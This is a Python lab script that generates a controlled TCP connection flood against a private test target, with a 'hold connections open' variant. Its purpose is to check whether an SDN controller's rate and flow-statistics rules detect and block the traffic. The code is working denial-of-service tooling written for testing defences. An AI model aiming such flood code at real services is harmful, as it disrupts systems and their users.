#!/usr/bin/env python3
"""
attack_conn_flood.py - CONTROLLED connection-flood test traffic (lab use only, attacker host).

Opens --rate new TCP connections per second to the target using normal sockets (no spoofing, no raw packets).
  default   : connect, send one line, close  (high connection RATE)
  --hold    : keep every connection open     (many CONCURRENT flows - the 'slow and low' variant that is
              caught by the flow-statistics rule instead of the connection-rate rule)
Prints a per-second table; stops automatically when the controller blocks us.
"""
import argparse
import socket
import threading
import time

lock = threading.Lock()
cnt = {"ok": 0, "fail": 0}
held = []


def attempt(target, port, timeout, hold):
    try:
        s = socket.create_connection((target, port), timeout=timeout)
        try:
            s.sendall(b"PING 0\n")
        except OSError:
            pass
        if hold:
            held.append(s)
        else:
            s.close()
        with lock:
            cnt["ok"] += 1
    except (OSError, socket.timeout):
        with lock:
            cnt["fail"] += 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="10.0.0.2")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--rate", type=float, default=60, help="new connections per second")
    ap.add_argument("--duration", type=float, default=30)
    ap.add_argument("--timeout", type=float, default=1.0)
    ap.add_argument("--hold", action="store_true")
    ap.add_argument("--keep-going", action="store_true")
    a = ap.parse_args()

    print("[flood] %.0f conn/s -> %s:%d for up to %.0fs %s" % (a.rate, a.target, a.port, a.duration, "(holding connections open)" if a.hold else ""), flush=True)
    start = time.time()
    next_t, sec_mark = start, 1
    last_ok = last_fail = 0
    bad_seconds = 0
    sent = 0
    try:
        while time.time() - start < a.duration:
            threading.Thread(target=attempt, args=(a.target, a.port, a.timeout, a.hold), daemon=True).start()
            sent += 1
            next_t += 1.0 / a.rate
            time.sleep(max(0, next_t - time.time()))
            if time.time() - start >= sec_mark:
                with lock:
                    ok, fail = cnt["ok"], cnt["fail"]
                d_ok, d_fail = ok - last_ok, fail - last_fail
                last_ok, last_fail = ok, fail
                print("[flood] t=%2ds  sent=%-5d  connected(+%d)  dropped/timeout(+%d)" % (sec_mark, sent, d_ok, d_fail), flush=True)
                bad_seconds = bad_seconds + 1 if (d_ok == 0 and d_fail > 0) else 0
                if bad_seconds >= 3 and not a.keep_going:
                    print("\n[flood] *** BLOCKED *** no connection succeeded for 3 seconds - the SDN switch drops our traffic.")
                    break
                sec_mark += 1
    except KeyboardInterrupt:
        pass
    time.sleep(a.timeout + 0.2)
    print("[flood] total attempts=%d  connected=%d  failed=%d" % (sent, cnt["ok"], cnt["fail"]))
    for s in held:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
